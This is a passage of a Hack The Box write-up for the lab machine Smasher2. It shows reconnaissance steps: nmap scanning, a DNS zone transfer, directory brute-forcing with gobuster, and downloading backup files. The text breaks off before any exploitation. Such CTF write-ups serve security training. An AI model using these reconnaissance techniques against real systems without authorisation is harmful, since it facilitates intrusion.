<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Smasher2 - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Smasher2"><a href="#Hack-The-Box-Smasher2" class="headerlink" title="Hack The Box - Smasher2"></a>Hack The Box - Smasher2</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today smasher2 retired and here’s my write-up about it. Smasher2 was an interesting box and one of the hardest I have ever solved. Starting with a web application vulnerable to authentication bypass and <code>RCE</code> combined with a <code>WAF</code> bypass, then a kernel module with an insecure <code>mmap</code> handler implementation allowing users to access kernel memory. I enjoyed the box and learned a lot from it. It’s a Linux box and its ip is <code>10.10.10.135</code>, I added it to <code>/etc/hosts</code> as <code>smasher2.htb</code>. Let’s jump right in!</p>
<p><img src="/images/hackthebox/smasher2/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# nmap -sV -sT -sC -o nmapinitial smasher2.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-12-13 07:32 EST</span><br><span class="line">Nmap scan report for smasher2.htb (10.10.10.135)</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)</span><br><span class="line">|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)</span><br><span class="line">|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)</span><br><span class="line">53&#x2F;tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure>
<p>We got <code>ssh</code> on port 22, <code>dns</code> on port 53 and <code>http</code> on port 80.</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>First thing I did was to enumerate <code>vhosts</code> through the <code>dns</code> server and I got 1 result:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# dig axfr smasher2.htb @10.10.10.135</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr smasher2.htb @10.10.10.135</span><br><span class="line">;; global options: +cmd</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">smasher2.htb.           604800  IN      NS      smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      A       127.0.0.1</span><br><span class="line">smasher2.htb.           604800  IN      AAAA    ::1</span><br><span class="line">smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 299 msec</span><br><span class="line">;; SERVER: 10.10.10.135#53(10.10.10.135)</span><br><span class="line">;; WHEN: Fri Dec 13 07:36:43 EST 2019</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 242)</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure>
<p><code>wonderfulsessionmanager.smasher2.htb</code>, I added it to my <code>hosts</code> file.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p><code>http://smasher2.htb</code> had the default <code>Apache</code> index page:<br><img src="/images/hackthebox/smasher2/1.png" alt=""></p>
<p><code>http://wonderfulsessionmanager.smasher2.htb</code>:<br><img src="/images/hackthebox/smasher2/2.png" alt=""><br>The only interesting here was the login page:<br><img src="/images/hackthebox/smasher2/3.png" alt=""><br>I kept testing it for a while and the responses were like this one:<br><img src="/images/hackthebox/smasher2/4.png" alt=""></p>
<p><img src="/images/hackthebox/smasher2/5.png" alt=""><br>It didn’t request any new pages so I suspected that it’s doing an <code>AJAX</code> request, I intercepted the login request to find out the endpoint it was requesting:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/auth</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: wonderfulsessionmanager.smasher2.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://wonderfulsessionmanager.smasher2.htb/login</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 80</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: session=eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg</span><br><span class="line"></span><br><span class="line">&#123;"action":"auth","data":&#123;"username":"test","password":"test"&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>While browsing <code>http://wonderfulsessionmanager.smasher2.htb</code> I had <code>gobuster</code> running in the background on <code>http://smasher2.htb/</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# gobuster dir -u http:&#x2F;&#x2F;smasher2.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;smasher2.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;12&#x2F;13 07:37:54 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.git&#x2F;HEAD (Status: 403)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.bash_history (Status: 403)</span><br><span class="line">&#x2F;.config (Status: 403)</span><br><span class="line">&#x2F;.bashrc (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.profile (Status: 403)</span><br><span class="line">&#x2F;.mysql_history (Status: 403)</span><br><span class="line">&#x2F;.sh_history (Status: 403)</span><br><span class="line">&#x2F;.svn&#x2F;entries (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;_vti_adm&#x2F;admin.dll (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;shtml.dll (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;_vti_aut&#x2F;author.dll (Status: 403)</span><br><span class="line">&#x2F;akeeba.backend.log (Status: 403)</span><br><span class="line">&#x2F;awstats.conf (Status: 403)</span><br><span class="line">&#x2F;backup (Status: 301)</span><br><span class="line">&#x2F;development.log (Status: 403)</span><br><span class="line">&#x2F;global.asa (Status: 403)</span><br><span class="line">&#x2F;global.asax (Status: 403)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;main.mdb (Status: 403)</span><br><span class="line">&#x2F;php.ini (Status: 403)</span><br><span class="line">&#x2F;production.log (Status: 403)</span><br><span class="line">&#x2F;readfile (Status: 403)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;spamlog.log (Status: 403)</span><br><span class="line">&#x2F;Thumbs.db (Status: 403)</span><br><span class="line">&#x2F;thumbs.db (Status: 403)</span><br><span class="line">&#x2F;web.config (Status: 403)</span><br><span class="line">&#x2F;WS_FTP.LOG (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;12&#x2F;13 07:39:17 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure>
<p>The only result that wasn’t <code>403</code> was <code>/backup</code> so I checked that and found 2 files:<br><img src="/images/hackthebox/smasher2/6.png" alt=""><br>Note: Months ago when I solved this box for the first time <code>/backup</code> was protected by basic <code>http</code> authentication, that wasn’t the case when I revisited the box for the write-up even after resetting it. I guess it got removed, however it wasn’t an important step, it was just heavy brute force so the box is better without it.<br>I downloaded the files to my box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# mkdir backup</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# cd backup&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# wget http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;auth.py</span><br><span class="line">--2019-12-13 07:40:19--  http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;auth.py</span><br><span class="line">Resolving smasher2.htb (smasher2.htb)... 10.10.10.135</span><br><span class="line">Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 4430 (4.3K) [text&#x2F;x-python]</span><br><span class="line">Saving to: ‘auth.py’</span><br><span class="line"></span><br><span class="line">auth.py                                                    100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   4.33K  --.-KB&#x2F;s    in 0.07s   </span><br><span class="line"></span><br><span class="line">2019-12-13 07:40:20 (64.2 KB&#x2F;s) - ‘auth.py’ saved [4430&#x2F;4430]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# wget http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;ses.so </span><br><span class="line">--2019-12-13 07:40:43--  http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;ses.so</span><br><span class="line">Resolving smasher2.htb (smasher2.htb)... 10.10.10.135</span><br><span class="line">Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 18608 (18K)</span><br><span class="line">Saving to: ‘ses.so’</span><br><span class="line"></span><br><span class="line">ses.so                                                     